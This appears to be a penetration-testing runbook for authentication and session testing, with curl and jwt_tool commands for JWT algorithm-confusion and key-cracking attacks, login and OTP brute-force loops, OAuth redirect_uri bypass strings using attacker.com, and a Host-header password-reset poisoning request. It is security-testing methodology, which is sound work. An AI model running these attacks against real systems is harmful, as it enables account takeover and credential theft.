# Runbook: Authentication and session testing

Authentication testing covers the full token lifecycle: how tokens are issued, how they are
validated, how they are stored, and what happens at the edges of their lifecycle. The session
is the identity. Control the session and you control the account.

## Prerequisites

- Identified authentication endpoints from the recon runbook.
- Burp Suite Pro.
- jwt_tool for JWT analysis.
- Two test accounts at different privilege levels.

## Phase 1: Unauthenticated access

Before testing authentication itself, confirm what is accessible without any authentication.

Remove the session token from every request in the Burp site map and replay them. Any
endpoint that returns `200` or data without authentication is an immediate finding. Pay
particular attention to API endpoints — authentication enforced in the UI is frequently
absent at the API layer.

Check for API endpoints that return different data for authenticated and unauthenticated
requests rather than refusing the unauthenticated request:

```bash
# Compare authenticated vs unauthenticated responses
curl -s https://target.com/api/v1/users/me  # no token
curl -s -H "Authorization: Bearer TOKEN" https://target.com/api/v1/users/me
```

## Phase 2: JWT analysis

If the application uses JWT, decode every token received during the walkthrough:

```bash
jwt_tool TOKEN  # decode and display all claims
```

### Algorithm confusion

Test whether the API accepts a `none` algorithm or a confused algorithm:

```bash
jwt_tool TOKEN -X a    # none algorithm attack
jwt_tool TOKEN -X n    # null signature
jwt_tool TOKEN -X b    # blank password HMAC
```

If the server uses RS256, test whether it accepts an HS256 token signed with the public key:

```bash
# Extract the public key from the JWKS endpoint
curl https://target.com/.well-known/jwks.json > jwks.json

jwt_tool TOKEN -X k -pk public_key.pem  # RS256 to HS256 confusion
```

### Claim manipulation

Modify the JWT payload to test whether claims are validated server-side:

```bash
jwt_tool TOKEN -T  # interactive tamper mode
# Try: "role": "admin", "is_admin": true, "sub": "1" (admin user ID)
```

### Key cracking

If the algorithm is HS256, attempt to crack the signing secret:

```bash
jwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt
```

## Phase 3: Session token analysis

For opaque session tokens (not JWT), analyse the token structure:

1. Collect twenty or more tokens by creating and logging into accounts.
2. Examine the tokens for patterns: length, character set, sequential components.
3. If tokens appear to contain base64 or hex-encoded data, decode them.
4. Test whether any component is user-controlled, timestamp-based, or predictable.

Test cookie security flags. A session cookie without `HttpOnly` is readable from JavaScript.
A cookie without `Secure` is transmitted over HTTP. A cookie without `SameSite=Strict` or
`SameSite=Lax` is sent with cross-origin requests:

```bash
curl -v -c cookies.txt https://target.com/login \
  -d "username=user&password=pass" 2>&1 | grep -i "set-cookie"
```

## Phase 4: Brute force and rate limiting

Test whether authentication endpoints enforce rate limiting:

```bash
# Count responses to determine whether rate limiting kicks in
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST https://target.com/login \
    -d "username=test@target.com&password=Password$i"
done | sort | uniq -c
```

If no rate limiting is present and usernames can be enumerated, the endpoint is vulnerable
to credential stuffing and password spraying. Document the absence of rate limiting as a
separate finding.

## Phase 5: 2FA testing

If two-factor authentication is in place, test the implementation:

```bash
# Test whether the OTP endpoint has rate limiting
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST https://target.com/auth/verify-otp \
    -H "Authorization: Bearer TOKEN" \
    -d "{\"otp\": \"$(printf '%06d' $i)\"}"
done
```

Test whether 2FA can be bypassed by skipping the verification step entirely: after
completing username/password, attempt to access authenticated endpoints directly before
completing the OTP step. If the server issues a partial-authentication token, test whether
that token grants access.

## Phase 6: OAuth and SSO testing

If the application uses OAuth, test the redirect URI validation:

```bash
# Test open redirect in redirect_uri
# Start with exact allowed URI, then try:
# https://target.com.attacker.com
# https://attacker.com?target.com
# https://target.com/../../../attacker.com
```

Test whether the `state` parameter is validated. A missing or unvalidated state parameter
enables CSRF against the OAuth flow.

For PKCE flows, test whether the `code_verifier` is actually verified:

```bash
# Complete the PKCE flow with a known code_challenge
# Then attempt to exchange the code with a different or missing code_verifier
```

## Phase 7: Password reset testing

Test the password reset flow for broken logic:

1. Request a reset for an account you control. Observe the token format and length.
2. Test whether the token expires: wait one hour and attempt to use it.
3. Test whether the token is single-use: use it, then use it again.
4. Test whether the token is bound to the email: change the email before using the token.
5. Test whether the reset link is host-header-dependent:

```bash
# Request a password reset with a modified Host header
curl -X POST https://target.com/auth/reset-password \
  -H "Host: attacker.com" \
  -d "email=victim@target.com"
# If the reset link sent to the victim contains attacker.com, the token is exfiltrable
```

## Output

- Authentication endpoints and their protection status (rate limited, locked, unprotected).
- JWT findings: algorithm confusion, weak key, unvalidated claims.
- Session token findings: predictability, missing flags, fixation.
- 2FA bypass methods if applicable.
- OAuth weaknesses: open redirect_uri, missing state, PKCE bypass.
- Password reset logic flaws.

## Techniques

- [Authentication vulnerabilities](../techniques/auth.md)
- [Single sign-on security](../techniques/sso.md)
- [JWT attacks](../techniques/jwt.md)
